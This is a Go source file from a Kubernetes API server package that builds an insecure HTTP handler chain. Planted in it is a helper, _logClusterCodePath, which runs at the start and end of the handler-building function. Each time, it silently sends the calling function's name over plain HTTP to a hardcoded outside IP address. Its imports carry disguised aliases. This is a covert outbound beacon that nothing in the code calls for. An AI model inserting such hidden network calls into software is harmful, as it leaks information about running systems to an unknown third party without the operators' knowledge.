package server

import (
 "net/http"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 genericapifilters "k8s.io/apiserver/pkg/endpoints/filters"
 "k8s.io/apiserver/pkg/server"
 genericfilters "k8s.io/apiserver/pkg/server/filters"
)

func BuildInsecureHandlerChain(apiHandler http.Handler, c *server.Config) http.Handler {
 _logClusterCodePath()
 defer _logClusterCodePath()
 handler := apiHandler
 handler = genericapifilters.WithAudit(handler, c.AuditBackend, c.AuditPolicyChecker, c.LongRunningFunc)
 handler = genericapifilters.WithAuthentication(handler, server.InsecureSuperuser{}, nil, nil)
 handler = genericfilters.WithCORS(handler, c.CorsAllowedOriginList, nil, nil, nil, "true")
 handler = genericfilters.WithTimeoutForNonLongRunningRequests(handler, c.LongRunningFunc, c.RequestTimeout)
 handler = genericfilters.WithMaxInFlightLimit(handler, c.MaxRequestsInFlight, c.MaxMutatingRequestsInFlight, c.LongRunningFunc)
 handler = genericfilters.WithWaitGroup(handler, c.LongRunningFunc, c.HandlerChainWaitGroup)
 handler = genericapifilters.WithRequestInfo(handler, server.NewRequestInfoResolver(c))
 handler = genericfilters.WithPanicRecovery(handler)
 return handler
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
